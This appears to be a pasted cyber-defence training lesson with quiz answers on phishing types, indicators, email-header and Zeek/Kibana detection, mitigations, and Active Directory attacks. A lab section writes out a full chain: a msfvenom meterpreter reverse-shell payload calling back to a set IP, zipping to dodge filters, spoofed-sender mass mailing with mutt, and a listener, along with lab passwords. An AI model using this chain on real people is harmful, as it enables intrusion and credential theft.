Phishing Attacks
﻿

﻿

﻿

"Phishing is a cybercrime in which a target or targets are contacted by email, telephone, or text message by someone posing as a legitimate institution to lure individuals into providing sensitive data such as Personally Identifiable Information (PII), banking and credit card details, and passwords." (Phishing.org)

﻿

Social engineering is an attack that exploits the human element of an organization’s security. Phishing is a subset of social engineering, which coerces users to divulge sensitive information or perform an action that they would not under normal circumstances, such as clicking on a malicious link or opening an attachment. Typically, attackers run phishing campaigns via email, however, other mediums such as phone calls or Short Messaging Service (SMS) have gained popularity as phishing platforms.

﻿

Spear phishing, a targeted form of a phishing attack, is widely used for initial access as per MITRE, primarily due to ease and accessibility. Anyone can send fake emails, and several tools such as SET facilitate sending mass emails with little technical knowledge, making these attacks widely accessible. Script kiddies and nation-state actors alike have been known to initiate phishing attacks; a testament to their success.

Which phase of the MITRE ATT&CK framework is spear phishing typically associated with?
 Initial Access

Types of Phishing Attacks
Phishing is a broad principle of attack that has many avenues of approach. Some common types of phishing attacks include, but are not limited to:

Spear Phishing
Whaling
Vishing
Smishing
Clone Phishing
﻿

﻿

﻿

Spear Phishing
﻿

This is a targeted form of phishing, in which the attacker tailors content specific to an organization, group, or individual. In spear phishing, attackers conduct research on the target in order to make the attack more personalized and increase the likelihood of a successful phishing attack.

﻿

An example of a spear phishing attack: Dragonfly, a cyber espionage group, sent spear phishing emails to employees working on US power grids that contained malicious attachments in hopes of gaining initial access into those systems.

﻿

Whaling
﻿

Whaling is another targeted phishing attack that is aimed towards high-profile targets, such as individuals that are part of the C-level suite at an organization. More effort and research goes into crafting of these emails due to the high returns for cybercriminals. As higher level personnel often have more access to sensitive information or more authority, the payout of whaling attacks are potentially higher than other phishing attacks. Whaling may have follow-on phishing attacks after the high-profile account is compromised, such as using the Chief Executive Officer’s (CEO) account to ask for a money transfer.

﻿

Vishing (Voice Phishing)
﻿

Vishing refers to phishing scams that take place over the phone. Comparatively, vishing has the most human interaction of all the phishing attacks but follows the same pattern of deception. The malicious actor often creates a sense of urgency to convince a victim to divulge sensitive information and uses spoofed caller Identification (ID) to appear as a trustworthy source. A typical scenario involves the attacker posing as a bank employee to flag up suspicious behavior on an account. Once they have gained the victim’s trust, they ask for personal information such as login details, passwords, and Personal Identification Numbers (PIN). The details are then used to empty bank accounts or commit identity fraud.

﻿

Smishing (SMS Phishing)
﻿

Smishing is a type of phishing which uses SMS messages as opposed to emails to target individuals. As smartphones gain more functionality, they also accumulate more vectors of attack. Similar to traditional email phishing, attackers can send malicious links, or use high pressure tactics to have users divulge sensitive information.

﻿

Clone Phishing
﻿

Clone phishing is a subset of a phishing attack that takes elements from an already sent legitimate email and replaces them with malicious counterparts. This could include spoofing an email address to appear similar to the original sender, replacing a legitimate link with a malicious one, or claiming to be a resend of the original email. 

What type of phishing attack involves targeting a high-level executive?
whaling

Indicators of Phishing
Attackers use several Techniques, Tactics, and Procedures (TTP) to conduct phishing campaigns. This section covers common TTPs associated with phishing. If a message contains some of these elements, then it may be part of a phishing attack.

﻿

Deceiving the Victim
﻿

Attackers use several tactics to deceive the victim. This includes, but is not limited to, sending enticing messages, creating a sense of urgency, impersonating a trusted sender, and appealing to authority.

﻿

Sending Enticing Messages
﻿

Lucrative offers and eye-catching or attention-grabbing statements are designed to attract people’s attention immediately. For instance, a message may claim that the intended victim won the lottery or that there is a hot single in the area waiting to meet. If the message sounds too good to be true, there is a strong chance that it is a phishing scam. Alternatively, something as simple as a link to a funny video or an interesting news article can be a phishing email as well. Attackers utilize seemingly endless amounts of tactics to entice users to click their malicious emails.

﻿

Creating a Sense of Urgency 
﻿

Cybercriminals often create a sense of urgency by stating that their hook requires immediate action. Victims feel compelled to act quickly and, as a result, make worse decisions than they normally would. An example is stating that deals are only for a limited time, or that a personal account may be suspended immediately if the victim does not take action within a few minutes. When in doubt, the best course of action is to independently verify with the organization that there is an issue.

﻿

Impersonating a Trusted Sender 
﻿

While it is possible to spoof email addresses under certain circumstances, it is also possible that legitimate email accounts are compromised and used in phishing campaigns. In the case that an email coming from a trusted source displays some phishing indicators, it is generally a good idea to independently verify with the organization/individual. Alternatively, attackers use domain names that are close to the domain that they are attempting to impersonate. For example, bankofarnerica.com looks similar to the legitimate domain bankofamerica.com, with the rn potentially passing as an m at first glance.

﻿

Appealing to Authority
﻿

People are more likely to obey someone they perceive has   some kind of authority. Common phishing attacks may impersonate organizations or figures of authority. Attackers may claim to be part of law enforcement, the Internal Revenue Service (IRS), or other government organization to make the victim more likely to cooperate. In DoD environments, pulling rank is a common method of trying to get things done by appealing to authority. As with trusted senders, independently verifying with the organization of authority is generally a good idea when in doubt.

Click "Continue" to proceed to the next task.
Auto-Advance on Correct

What domains are suspicious if the user receiving them was part of mydomain.com?

Phishing Email Contents
Unless the purpose of the phishing attack was to simply elicit information from the victim, the attacker needs to deliver something in the content that has the capacity to execute code. In most cases, a user getting exploited simply by opening an email is unlikely. In the past, some mail clients allowed JavaScript, which brought the possibility of exploitation just from opening the email. Now, most modern email clients only allow for Hypertext Markup Language (HTML) or plain-text, which does not allow code execution. This would require a vulnerability in the mail client to implement, and is a rare occurrence albeit not impossible.

﻿

More common methods used by attackers are malicious attachment files or getting the user to navigate to a malicious website by clicking a link.

﻿

Attachments
﻿

Attachments in phishing emails often contain malicious payloads. In the past, a popular method was simply attaching an executable and attempting to convince a user to run it. As email filters become more and more sophisticated at protecting users from themselves by disallowing certain file types, attackers had to adapt. They now implement their code in more innocuous seeming file types. An attacker can easily embed JavaScript in a Portable Document Format (PDF) file or macros in Microsoft Office documents that execute once opened.

﻿

Links
﻿

The sky is the limit once the victim decides to click on a hyperlink taking them to a location of the attacker’s choice. Since the attacker controls the website, they can initiate a variety of attacks here. Attackers can steal cookies, attempt to exploit the user’s browser, etc. A user can be exploited from just visiting a website.

Other Indications of Phishing
Misspellings and Grammatical Errors
﻿

There are a few reasons for misspellings and typos in a phishing email. The most common sense reason is that the cybercriminals sending them may not be from English-speaking countries, thus do not have a good handle on the language. Another reason is that email filters look for specific strings in emails to make filtering decisions. If words are misspelled, then the email filter may allow the email to reach the user’s inbox. A more insidious reason for the prevalence of typos in phishing emails is that cyber criminals want to isolate the most gullible targets by sending overly ridiculous emails.

﻿

Unexpected Domain or Sender
﻿

Attackers may use free email services or send emails from unexpected domain names. Phishing campaigns are initiated by attackers with a broad range of technical skill. Since the only thing needed for a phishing attack is an email address that can send emails, attackers often use free email services such as Gmail or Yahoo email accounts to send phishing emails. 

﻿

Unusual Email Headers
﻿

Emails that have spoofed sender data may show inconsistencies in the email headers. Simple Mail Transport Protocol (SMTP) does not have mechanisms for validating email by default. If an attacker has access to their own mail server, they can control some of the data that goes in the email headers. Some fields that may help identify phishing attacks are:

﻿

Received-By: There may be multiple entries in this field. Emails typically contain entries of all mail server hostnames and Internet Protocol (IP) addresses they have traversed to reach their final destination, similar to a traceroute. The first destination in the chain, or the mail server that the attacker first relayed the mail to, may be a giveaway that the email is not legitimate.
Received-SPF: Sender Policy Framework (SPF) is an email security mechanism that allows administrators to specify allowed IP addresses and hostnames authorized to send mail on behalf of a domain. An email with a spoofed sender may fail this check.
Authentication-Results: This field contains information related to Domain Key Identified Mail (DKIM), Domain-based Message Authentication Reporting and Conformance (DMARC), and SPF. DKIM, DMARC, and SPF work together to provide email authentication. If this field states that these checks did not pass, the user should rightfully be wary. These protocols are discussed in more detail later in the lesson.
Return-Path: This is the field that specifies where messages that failed to send go. This is required to be a real email address, and is often what email security protocols check. Defenders can compare the Return-Path to the From field, which may reveal spoofing.

Phishing Follow-On Actions
Once the attacker successfully deceives the victim, follow-on actions typically include:

﻿

Gathering Data
﻿

This attack does not deliver a payload in a technical sense. Victims divulge sensitive information, such as social security numbers, bank account numbers, and other PII. This can result in identity theft for the victim.

﻿

Harvesting Credentials
﻿

Credential harvesting can be considered a subset of data gathering. Attackers attempt to gather login credentials, which could allow for follow-on attacks. A common phishing attack involves notifying users that their credentials were compromised, and to change their password by clicking on a link in the email. The link takes the victim to a site that impersonates the site’s login page. When users enter their credentials, the attacker collects them.

﻿

Executing Code
﻿

An attacker may want more functionality after they successfully compromise a victim’s machine, which they can achieve via running their own specific code or running commands. If desired, they can deliver an exploit depending on the software, and/or drop a payload, if no exploit was needed (run reconnaissance surveys, etc.).

﻿

Advanced Persistent Threat (APT) 28, or FANCY BEAR, is a Russian nation-state actor that has utilized phishing messages using spoofed websites to harvest credentials against their targets of interest in the US and Western Europe. Additional information on APT28 can be found here: https://attack.mitre.org/groups/G0007/.

﻿

Conducting a Phishing Campaign
﻿

Conduct a simple phishing campaign to gain insight into how one might be performed. Use the popular Mutt command line email client to send phishing emails with a standard meterpreter executable as the payload. Carry out a mass mailing campaign once they are successful with the requisite tasks.

﻿

Workflow

﻿

1. Log in to the cda-kali-hunt Virtual Machine (VM) using the following credentials:

﻿

Username: trainee
Password: Th1s is 0perational Cyber Training!
﻿

2. Open Terminal Emulator from the menu bar.

Postfix, an SMTP server, is preinstalled and preconfigured on the cda-kali-hunt machine. The purpose of having a local mail server is to control certain elements of the email header without getting rejected from the SMTP server.

﻿

3. Run the following commands:

﻿

$ sudo systemctl status postfix
$ sudo ss -lptn
﻿

These commands verify that the Postfix service is functional. The first command queries the status of Postfix from systemd, which is active.

The second command checks the socket status of listening Transmission Control Protocol (TCP) ports (-l -t), shows the associated process (-p), and does not perform name resolution on the port numbers (-n). Since the SMTP port is open (port 25), the local server is ready to send mail.

4. Create a malicious payload in MsfVenom:

﻿

$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=199.63.64.51 LPORT=4444 -f exe-small -o attachment.exe
﻿

The options used in this command are:

-p: Specifies the desired payload. Since the target(s) in this domain are Windows 10 workstations, the appropriate payload is the 64-bit windows reverse TCP payload. The reverse_tcp payload has the benefit of being better at circumventing end user host and network firewalls since the connection is initiated by the end user’s host device.
LHOST: This is the address that the exploited device calls back to.
LPORT: This is the port that the exploited device calls back to.
-f: This is the file format of the created payload. exe-small creates small Windows-compatible payloads.
-o: This option specifies the output file: attachment.exe.
﻿
5. Zip up the payload by running the following command: 

﻿

$ zip attachment.zip attachment.exe
﻿

The above command takes attachment.exe (created in MsfVenom) and compresses it into a zip archive — attachment.zip. Many organizations have settings configured that reject messages with executables attached to them. Zipping the file may circumvent these controls in many circumstances. However, many organizations are now blocking email messages containing Zip file attachments.


Before sending the phishing email, start a listener to catch the callback from the end user’s host machine.

﻿

6. Open a new terminal window, and run the following command to access the Metasploit console:

﻿

$ msfconsole


7. Run the following command once the console loads:

﻿

use multi/handler
﻿
8. Set the payload parameter to match the payload used earlier. View the associated options used with this payload.

﻿

set payload windows/x64/meterpreter/reverse_tcp
show options
﻿
The parameters associated with the payload are EXITFUNC, LHOST, and LPORT. EXITFUNC defines the exiting behavior of the payload (i.e., the process terminates on the end user device when the payload completes execution). The default setting is fine in this case. The LHOST option specifies which interfaces on the cda-kali-hunt VM listen for callbacks. This needs to be set to 0.0.0.0, or all available interfaces on the cda-kali-hunt. The LPORT defaults to 4444, which was used in Step 4 with MsfVenom, so the default value does not need to be changed.

﻿

9. Set the listening host by running the following commands:

﻿

set LHOST 0.0.0.0
show options

10. Verify that everything is correct, and run the following command to start the listener as a job:

﻿

run -j
﻿
With the listener receiving a callback, finish crafting the phishing email.

﻿

11. Switch back to the other open terminal, and create a message used as the email body. Incorporate some indicators of phishing in the message.

﻿

$ echo 'This is your company administrator. Malware has been detected on your computer. Use the attached zip file to remove the virus immediately!' > message.txt
﻿

The command above takes the provided string and redirects the output into a file named message.txt.

12. Send the email with the attachment using the following command:

﻿

$ mutt -e 'my_hdr From:admin <admin@cda.com>' -s "DETECTED MALWARE!" phishme@cda.com -a attachment.zip < message.txt
-e: Specifies a configuration option. This command spoofs the administrator’s email address by changing the contents of the From field.
-s: Subject line of the message
-a: Specifies a file to attach.
phishme@cda.com: The recipient and the target of the attempted phish.
< message.txt: Redirects the contents of message.txt into the command, which sets the contents of the file as the message body.

14. Open Google Chrome from the desktop, and select Outlook Web App from the bookmarks. Select Advanced > Proceed to cda-mail.corp (unsafe) when the certificate warning appears.

﻿

NOTE: This appears because the Public Key Infrastructure (PKI) is not configured in range. In turn, the certificate authority that signed the mail server’s certificate is not trusted by cda-acct-1.


15. The Phishme user must log in to the webmail portal to access their inbox. Enter the following credentials when prompted:

﻿

Username: cda\phishme
Password: Th1s is 0perational Cyber Training!
﻿
16. Select the only email in the inbox.

Notice that the email appears to come from a legitimate user within the CDA domain.

﻿

NOTE: There are two domains configured in this network: CDA.CORP and CDA.COM. Microsoft recommends having an internal domain and an external Domain Name System (DNS) for security purposes, a practice known as split-brain DNS. For example, users on the internet should not be able to see the names and addresses of domain controllers on the intranet. The internal domain is for devices that should be resolvable by name within the intranet, and the external domain is resolvable by name via the public internet. Both domains are valid for the users in the CDA network in this case, however, the CDA.CORP domain is only resolvable from within the network.

﻿

17. Select the attachment in the email to download it. Once the download completes, open the downloaded file.

18. Run the executable inside the Zip file; the file does not need to be extracted.

19. Select Run if a security warning appears.

20. Switch back to the cda-kali-hunt VM. A new meterpreter session is presented.

21. View sessions with the sessions command. Interact with the created session by entering the command:

﻿

sessions -i 1
﻿

22. To see what user meterpreter is running under on the exploited system, run the following command:

﻿

getuid
﻿

Since the user was the one that started the meterpreter process, the privileges the attacker has are those of the user that started the process. In this case, the user is cda\trainee. The attacker has initial access at this stage; follow-on actions would likely be to privilege escalate to gain more robust access to the machine.

﻿

23. Exit the session.

﻿

exit
﻿

24. For mass mailer attacks, loop through the mail command with a list of provided emails. In a terminal on the cda-kali-hunt VM, open a Vim editor (or any text editor), and create a file named emails.txt. The contents of the file should be these emails separated by line. Save the file.

﻿

$ vim emails.txt
﻿

patti.mcclure@cda.com
stevie.roach@cda.com
camron.smith@cda.com
leonard.blevins@cda.com
mikaela.rubio@cda.com
jess.whitney@cda.com
andrew.oconnor@cda.com
philip.holt@cda.com
madelyn.rodriguez@cda.com
﻿
Typically, this is when the listener starts again to catch any potential callbacks, but this will not be activated during this step. The purpose of this step is to simply simulate a mass mailer.

﻿

25. After the emails.txt file is created, run the following one-line Bash command in the terminal to send emails to all users in the file:

﻿

$ for email in $(cat emails.txt); do mutt -e 'my_hdr From:admin <admin@cda.com>' -s "DETECTED MALWARE!" $email -a attachment.zip < message.txt; done
﻿

This command is a simple Bash script that uses a Bash for loop to run the same mutt command run earlier on each email. The for loop sends the emails individually to each user, which prevents the recipients from seeing other recipients in the email headers. An alternative option method is using the Blind Carbon Copy (BCC) field to not have a loop, which achieves the similar functionality. However, some mail clients still show signs that there were other recipients on the email.

﻿
26. Verify that the emails were sent successfully by checking the mail log for a successful entry:

﻿
$ sudo grep "status=sent" /var/log/mail.log

Phishing Attack Detection
On a network, some indicators of phishing include:

﻿

Several emails coming from a single user: There may be a few reasons an attacker uses a single user to send several emails. A compromised email account may be trustworthy in a specific domain. Alternatively, creating an email account and sending mass emails is a trivial matter for attackers.
Several emails coming from a suspicious domain: Suspicious domains refer to either an unexpected domain (e.g., a free email service domain like Yahoo or Gmail). External domains are inherently more suspicious than internal domains. It can also refer to a domain that the attacker is attempting to impersonate.
Unusual email headers: Unusual email headers may give away a spoofed email address, though this practice is uncommon with modern day email authentication protocols.
﻿

If there are phishing indicators on a network, then hunt for additional indicators of compromise within the mission partner’s networks.

﻿

NIDS and Security Information and Event Management (SIEM) systems are helpful in detecting phishing attacks over a network. Observe some signs of a phishing attack occurring over the mission partner’s network using Kibana and Zeek logs.

Detecting Phishing Emails
The mission partner suspects that phishing campaigns have occurred within their network. The Cyber Protection Team (CPT) is tasked with confirming this hypothesis. A packet capture has been loaded into the Security Onion analyst interface, which was taken on the mail server. The mission partner’s domain is cda.com.


After logging in, select Kibana from the bookmarks.

4. In the top right corner of the page, select Show Dates.

This allows a time range to be specified. The current time range is set from ~ a day ago to now.


5. Select ~ day ago. From the drop-down menu, select Absolute and set the time to April 20, 2021 00:00.


6. Select now next to the date/time entered. Select Absolute and set the end date to April 21, 2021 00:00.

﻿

7. Select Update.

Notice the dashboard changes. There is still a lot of data currently displayed, but not all of it is useful for tracking down potential phishing attacks.

Focus your attention on mail protocols for this step. Recall the ports and services associated with mail services:

﻿

Mail clients send emails to SMTP servers. SMTP and SMTP Secure (SMTPS) mail ports are:

Internet Message Access Protocol (IMAP) 4 or IMAP Secure (IMAPS), and Post Office Protocol (POP) 3 or POP Secure (POPS) are the standard protocols mail clients use to retrieve their mailboxes.


Webmail provides an alternative client interface for users to read and send emails. These include the standard web ports:

If Zeek is configured on a sensor, it breaks out SMTP protocol data into the smtp.log, by default. This log — and many others from Zeek — was ingested into the open Kibana instance. The Security Onion dataset widget lists the different data sources, which includes smtp.log data. 

﻿

8. Select smtp from the Security Onion - Dataset visualization. This is on the third page. 

﻿

The dashboard changes again.

﻿

9. Set the time range again. Selecting from the dataset widget resets the selected time range to the last 24 hours. However,once a time range is set, it appears in the history. Select the calendar drop-down menu, and select the prior time range.

﻿Detecting Phishing Emails | Kibana
NOTE: The following steps continue from the previous task.

﻿

8. Select the Menu Button (three lines) in the top left corner. Under Kibana, select Discover.

9. Currently, there is too much information in the view. Select the important fields. Select the > next to the first entry. 

10. This expands all the fields in the entry. Select all the important fields to populate the search view by hovering over the field, and selecting Toggle Column.

11. Select the following fields to toggle:

_id: An Elasticsearch metadata field that assigns a unique index to an Elasticsearch document.
smtp.first_received: First host and IP address that received the message.
smtp.from: Displayed sender; this field can be spoofed.
smtp.mail_date: Contents of the date field.
smtp.mail_from: Real sender address; may differ from smtp.from.
smtp.path: Contains the mail servers traversed before the email reached its final destination. The first IP address is the final destination. This field is difficult to spoof as each mail server that the message traverses adds its information to this field. 
smtp.recipient_to: Real recipient email that the message is sent to; may differ from smtp.to.
smtp.subject: Subject line of the email.
smtp.to: Displayed recipient.
﻿

12. The new view looks similar. Select the arrow next to Time (upper corner) to sort by ascending time (oldest entries first).


13. Examine the first entry. Notice that it is immediately suspicious due to the smtp.mail_from field. The sender comes from an external domain — internet.com  — but attempts to pose as a legitimate user from within the CDA domain by using the username cda_hr. In addition, there are a lot of emails listed in the smtp.recipient_to field, which is indicative of a mass mailer.


14. Select the link in the _id field. This reconstructs the packets collected as part of that session in a new tab in Security Onion. It may take a few seconds to run.

﻿
﻿

15. The Wireshark Follow TCP Stream option stitches the data together in a more human-readable format. Security Onion can display the data in a similar format. Select the list and the hex button to toggle these views off.

The resulting view shows an easily followable data stream. Blocks with red are from the mail server.

16. Scroll down to examine the email captured in the SMTP session.

﻿Phishing with Legitimate Email Accounts
NOTE: The following steps continue from the previous task.

﻿

17. Examine the next entry in the SMTP logs. 

This appears to be from the legitimate cda.com domain, and does not immediately set off any alarms, other than the fact that one of the recipients is an administrator, a potential high-value target for an attacker.

﻿

18. Select the data in the _id field to reconstruct the packets.

﻿

19. To efficiently view the packets, increase rows per page to 50 by selecting the pop-up menu at the bottom of the page.


Nothing seems particularly out of the ordinary in the email header or message except for the urging to complete the requested action.

There is also the Form.xlsm Excel spreadsheet attached that is referenced in the message, as per the Multipurpose Internet Mail Extensions (MIME) Content-Type field. Recall that MIME allows for other file formats in email messages such as videos and documents. The Content-Type lists the file as an Excel spreadsheet that has macros enabled, which is generally not a good sign.

﻿

NOTE: As the MIME Content-Type is typically determined via a hardcoded list cross-referenced to the file extension, the actual file type may not reflect what the Content-Type displays. Simply renaming the file extension is enough to change the MIME Content-Type.

It is possible to extract files from the capture in this case for further examination, and there are a number of ways to perform the action. File extraction can be configured in Zeek automatically, or the file is simply carved out of the capture.

﻿

NOTE: Be cautious with carving potential malware onto a system connected to a network. The last thing that needs to happen is infecting the CPT’s Deployable Mission Support System (DMSS) setup.

﻿

A trick that works in a pinch for a quick and dirty file carve with base64 encoded data is as follows:

﻿

20. Highlight where the data for the Excel spreadsheet begins…

…to where it ends.

21. With the data copied, run the following command while replacing <data> with the data in the clipboard. It may help type out the entire command first, then paste the data between the single quotes due to the newlines that are copied with the data.

﻿

trainee@cda-lin-hunt:~$ echo '<data>' | tr -d "\n" | base64 -d > form.xlsm
﻿

The command broken out:

echo '<data>': Prints the data to the terminal.
tr -d “\n“: tr stands for translate and allows the user to perform basic text manipulation such as replacement and deletion. -d specifies delete, and in this case, deleting all the newline characters, as they are an unintended byproduct of copying text.
base64 -d: Decodes base64 encoded data.
>form.xlsm: The file that the decoded data is written to.
﻿

22. If done correctly, then running the file command on the output file shows an Excel file type.

trainee@cda-lin-hunt:~$ file form.xlsm

The easiest way to examine Visual Basic macros is in an Office product, but there are some open-source tools that provide for this as well, such as the oletools project.

Analysis of the Visual Basic macro in this task is outside the scope. Follow-on actions include providing samples to malware analysts.

Since the suspicious email originated from a legitimate email account, one would generally expect the message to be from the owner of the email account. A very possible scenario, in this case, is that a legitimate account was compromised, and the attacker is masquerading as a legitimate user to hook other users. When in doubt, as in this case, the mission partner is a valuable resource. Asking may yield the quickest answer on whether it is a phishing email.

﻿ Macro-enabled document

Phishing with Spoofed Email Addresses
NOTE: The following steps continue from the previous task.

﻿

23. Examine the next several entries. Notice they are all very similar, save for the user.

In the from field, admin@cda.com is a legitimate user. However, the mail_from field has the sender as trainee@cda-kali-hunt.attack.local. The first_received field shows that the first mail host that received the mail was cda-kali-hunt.attack.local on a Postfix server.

﻿

The mission partner states that they have no relay servers configured, so these entries look strange indeed. The subject also has a strong sense of urgency associated. 

﻿

The mission partner states that they have no email authentication protocols configured for their domain, so the verdict is clear. The contents of the from field are almost certainly spoofed.

﻿

24. Select any of the links in the _id field. The message is the same, with the only difference being the user.


Many grammatical and spelling errors as well as a Zip file attachment are present.

﻿

25. Follow the same steps for the previous email attachment to extract the Zip file from the email.

﻿

trainee@cda-lin-hunt:~$ echo '<data>' | tr -d "\n" | base64 -d > attachment.zip
﻿

If done correctly, then the output file is recognized as a Zip file.


26. List the contents of the Zip file.

trainee@cda-lin-hunt:~$ unzip -l attachment.zip
﻿
The Zip file unsurprisingly contains an executable (.exe) file that is almost certainly malicious.

itigations on the Network
Edge Transport Server
﻿

This is a specific type of relay host in Microsoft Exchange architecture that external organizations send mail to. The Edge Transport Server has several mechanisms to screen emails before they are forwarded to the Exchange mailbox server.

﻿

Dedicated Spam-filtering Appliance
﻿

Other vendors have appliances with comparable functionality to Edge Transport Servers, as far as screening mechanisms go. A popular dedicated spam appliance is Barracuda’s Spam Firewall. 

﻿

Web Application Firewall/Proxy
﻿

Web application firewalls help protect against cases where a user attempts to navigate to a malicious link — including links that are included in phishing emails. Web application firewalls detect navigation to malicious domains, malicious network traffic, or Command and Control (C2) communications from infected hosts on the network.

Web application firewalls are effective against local exploits from attachment-based phishing emails.
false cant control end users

Which feature is only available on an Edge server in Exchange environments?
attachmetn filtering

Mitigations on the Endpoints
As mentioned previously, two common methods of executing code are by getting users to open attachments, and getting users to click on links. Mitigations can be implemented to reduce the damage of either of those things happening.

﻿

HBSS: If a user saves an attachment (some mail clients provide the option of opening the attachment without saving it first) from a malicious email on disk, an HBSS may flag the malware and quarantine or remove it if it contains some qualities that the HBSS deems unsafe. Some HBSS software has the capability to examine an attack in memory, which could prevent an attack if the user opens the attachment instead of saving it first. Some HBSSs may also defend against web attacks. Enabling the HBSS and keeping signatures updated are good practices in defending against phishing attacks.

﻿

Disabling Scripts and Macros: If a user downloads an attachment with macros, or visits a site from a link with malicious script, it may lead to a compromise. A good practice is to disable macros in documents by default. In addition, most browsers have settings that disable JavaScript or other web-based content from running without explicit permission. One caveat is that JavaScript is ubiquitous, and disabling it breaks functionality on several web 

Some HBSSs are effective at defending against both attachments and malicious websites.
true

Other Miscellaneous Mitigations
As briefly mentioned before, DKIM, SPF, and DMARC work together as email authentication protocols. Their individual purposes are as follows:

﻿

DKIM: DKIM uses PKI to sign emails leaving the sending server. The receiving mail server verifies that the message is authentic and has not been altered in transit by using the public key published in the sending organization’s DNS records.

﻿

SPF: SPF publishes authorized mail servers and hostnames in a DNS record for the domain. The receiving mail server checks the SPF record to ensure that the sending mail server is authorized to send mail on a domain’s behalf, usually based on the Return-Path field in the email header.

﻿

DMARC: DMARC utilizes the previous protocols and adds a reporting feature on top. It allows domain owners to see who is sending emails on their behalf.

﻿

Implementing these protocols has a two-fold benefit of preventing attackers from spoofing a domain owner’s domain, thus preventing emails from appearing as if they originated inside the organization, and using the domain owner’s domain in phishing attacks against other organizations. If attackers are unable to spoof an organization’s domain, then users are more certain of an email message’s origin and make better informed decisions based on the domain.

What are the components of email authentication protocols?

dashboard for zeek network lololol smtp

39-43
10-16 boddhoundxxxx
2
sql01
true

AD Tactics and Techniques
AD attacks generally fall in the privilege escalation and lateral movement MITRE tactics. However, since it does maintain a directory of all objects within the domain, AD can be used to gather information about a network as well establish persistence. Some common AD attacks are discussed in this task.

﻿

Kerberoasting
﻿

﻿

Figure 16.3-1 — Image from Pen Test Partners 

﻿

Kerberoasting is a post-exploitation technique that allows any compromised user to gather Service Tickets (ST), which are encrypted with the service account’s password. Recall that STs are obtained to gain access to resources after an account authenticates to Kerberos and obtains a Ticket Granting Ticket (TGT). Any user can request a ticket for any service by default as long as they have a valid TGT. Services are identified by Service Principle Names (SPN), which is a unique Identifier (ID) of a service instance. If an account has an associated SPN, then they can obtain the password hash for the service account, though the attacker still has to be able to brute force the password.

﻿

User accounts associated with services are the most vulnerable, as administrators often sets the passwords for these accounts once and then forgets about them. User accounts associated with SPNs are also protected by weaker encryption than SPNs associated with computer accounts (e.g., the LocalSystem account). Service accounts are more valuable than typical user accounts since they often have significant privileges, which may allow the attacker to quickly move laterally within an AD domain and potentially escalate their privileges. Kerberoasting is a MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK) sub-technique with the identifier T1558.003.

﻿

Unconstrained/Constrained Delegation
﻿
Delegation, in a nutshell, allows a user or computer to impersonate another account. Unconstrained delegation means that the user or computer can impersonate any service, whereas constrained delegation specifies what services the user or computer is allowed to impersonate by reusing end-user credentials. Due to security implications, delegation is disabled by default, but has legitimate use. For example, consider a mail server with webmail services enabled. When a user logs onto the webmail service to access their emails, they must be authenticated before gaining access to the resources they requested. The webmail service authenticates the user, stores their TGT, then forwards their TGT to the DC on the user’s behalf any time they need to access resources within the domain from the webmail server. Delegation can be attacked by compromising the machine or account that has delegation privileges, and then extracting all the TGTs in memory. This technique would fall under MITRE ATT&CK technique ID 1558: Steal or Forge Kerberos Tickets.

﻿

DCSync
﻿
DC replication is a valid and necessary function of AD that allows DCs to synchronize data between them. Adversaries abuse this functionality by simulating the behavior of a DC and asking other DCs for an entire copy of their AD database, which includes user credentials. For this attack to be successful, the adversary needs an account with administrator, domain administrator, or enterprise administrator privileges. Alternatively, the adversary needs the permissions of Replicating Directory Changes, Replicating Directory Changes All, or Replicating Directory Changes in Filtered Set. This attack is known under the MITRE ATT&CK technique ID 1003.006 as a credentialed access tactic.

﻿

Pass-the-Ticket
﻿
As per MITRE:

﻿

Adversaries may Pass the Ticket (PtT) using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. PtT is a method of authenticating to a system using Kerberos tickets without having access to an account's password [or password hash]. Kerberos authentication can be used as the first step to lateral movement to a remote system.

﻿

When adversaries gain access to a host, they may attempt to dump OS credentials, which may present them with a valid Kerberos TGT. The stolen TGT then allows adversaries to request service tickets for any service within the domain, effectively masquerading as that user on the domain. PtT attacks are extremely effective following the compromise of a host with delegation enabled. PtT is a defense evasion or lateral movement tactic with the MITRE ATT&CK sub-technique ID T550.003.

﻿

Pass-the-Hash
﻿
A Pass-the-Hash (PtH) attack relies on weaknesses within New Technology Local Area Network (LAN) Manager (NTLM). NTLM is a suite of security protocols that relies on challenge-response mechanisms to provide a Single Sign-On (SSO) solution. The challenge response sequence for NTLM involves the following:

﻿

1. The client requesting access to a resource on a server sends a negotiation message.

2. The server sends back a challenge message, which is a 16-byte random number.

3. The client returns the challenge to the server, encrypted by the hash of the user’s password.

4. The server sends the encrypted challenge back to the DC to verify that the password hash used was correct.

﻿

Since the hash rather than the password is used during the encryption process, the hash is sufficient to access resources on behalf of the user when using NTLM security protocols. While Kerberos is the default authentication protocol starting with Windows 2000 and later releases, NTLM security protocols are still used for legacy support, as well as a backup in the case that Kerberos fails to authenticate a user. PtH is a MITRE ATT&CK sub-technique with the ID T1550.002 and can be used for lateral movement and defense evasion.

﻿

Golden/Silver Ticket Attack
﻿
If an adversary has the NTLM password hash of service accounts, then they can issue tickets for those services. For a typical service, the adversary can forge service tickets, which is known as a Silver Ticket attack. In the worst case scenario, if the Kerberos Ticket Granting Ticket (KRBTGT) service account NTLM password hash is compromised, then the adversary can forge TGTs for any account in the AD, known as a Golden Ticket attack. Golden and silver ticket attacks fall under the MITRE ATT&CK tactic credentialed access, and are referred to by the sub-technique IDs 1558.001 and T558.002 respectively.

﻿

User Access Control Bypass
﻿
In a nutshell, User Access Control (UAC) is a security feature implemented starting with Windows Vista that prompts the administrator for consent for applications requiring administrative access. Administrative accounts also have a user-level access token and a superuser access token, so even administrators running programs from a privileged account need to indicate their approval in a prompt. The primary intent of UAC is to ensure that most applications run with user-level privileges unless the administrator specifies otherwise, which would prevent accidental system changes or malware compromising a system.


UAC bypass circumvents the prompt so that it does not appear, which may seem trivial, but adversaries often only have remote access and cannot approve the prompt. This corresponds to MITRE ATT&CK ID T1548.002 and can be used for privilege escalation and defense evasion. Despite being a MITRE ATT&CK sub-technique, many methods have been discovered to mitigate this security feature. UACMe is a Github repository that keeps track of some of them.

Which technique involves requesting numerous service tickets to brute force the associated service credentials?
kerbroast

AD Tactics and Techniques | Execution and Persistence
Execution
﻿

Upon hearing AD, the first thing that should come to mind is Windows OSs. While not a feature of AD, the following utilities can be leveraged by an adversary to execute commands within AD environments as they primarily contain Windows OSs:

﻿

